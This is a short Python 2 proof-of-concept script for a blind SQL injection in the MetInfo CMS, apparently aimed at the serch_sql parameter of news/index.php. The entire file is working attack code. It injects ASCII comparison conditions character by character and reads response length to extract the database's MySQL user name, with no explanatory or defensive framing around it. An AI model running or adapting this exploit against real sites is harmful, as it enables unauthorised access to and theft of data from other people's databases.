

#!/usr/bin/env python
# coding:utf-8
import re
import random
import time
import string
import sys
import requests



def verify():
    chars = list('abcdefghijklmnopqrstuvwxyz0123456789@_.')
    payload = "http://localhost/MetInfo/news/index.php?serch_sql= 123qwe where"
    print 'start to retrive MySQL user:'
    user = ''
    for i in range(15):
        for char in chars:
            s = "ascii(mid(user(),%s,1))=%s-- x&imgproduct=xxxx" % (i,ord(char))
            #req = urllib2.Request("%s%s" % (payload,s))
            html_doc = requests.get('%s %s' % (payload,s),timeout=20)
            print '.',
            if len(html_doc.text) > 9000:
                user += char
                print '\n[please wait] %s' % user,
                break
    print '\n[Done]MySQL user is', user

if __name__ == '__main__':
    verify()
